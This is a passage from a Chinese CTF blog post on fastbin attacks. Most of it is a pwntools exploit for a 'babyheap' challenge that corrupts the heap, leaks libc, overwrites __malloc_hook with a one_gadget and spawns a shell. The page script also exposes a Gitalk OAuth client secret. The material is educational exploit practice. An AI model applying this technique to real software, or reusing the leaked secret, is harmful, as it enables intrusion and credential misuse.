class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fill(idx, size, content):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump(idx):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x10)#0  00</span><br><span class="line">allocate(0x10)#1  20</span><br><span class="line">allocate(0x10)#2  40</span><br><span class="line">allocate(0x10)#3  60</span><br><span class="line">allocate(0x80)#4  80</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80)</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80)#5</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬  </span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">target = main_arena - 0x33 </span><br><span class="line">addr = p64(target)</span><br><span class="line">fill(2,len(addr),addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">allocate(0x60)#4</span><br><span class="line">allocate(0x60)#target 6</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(onegadget)</span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x100)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>参考链接：<br>        <a href="https://bbs.pediy.com/thread-247214.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247214.htm</a><br>        <a href="https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/" target="_blank" rel="noopener">https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/</a><br>        <a href="https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看</a>)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://c0yo7e.github.io/2020/02/07/fastbinin-attack/" data-id="ckdlmpmy5000bvgsw1ojav3j4"
         class="article-share-link">Share</a>
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>

    </footer>

  </div>

  
    
  <nav class="article-nav">
    
      <a href="/2020/02/07/arm的环境搭建-简单的例题/" class="article-nav-link">
        <strong class="article-nav-caption">Newer posts</strong>
        <div class="article-nav-title">
          
            arm的环境搭建+简单的例题
          
        </div>
      </a>
    
    
      <a href="/2019/10/07/runtime-resolve/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">runtime_resolve</div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '57453e2505e1523b1d78',
      clientSecret: 'c9d2109f4649be7dca5ef5622d85e38608a7cd1e',
      repo: 'content',
      owner: 'C0yo7e',
      admin: ['C0yo7e'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 The lair of C0yo7e</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

  <script src="/fancybox/jquery.fancybox.min.js"></script>



  <script src="/js/tocbot.min.js"></script>
  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>


<script src="/js/ocean.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>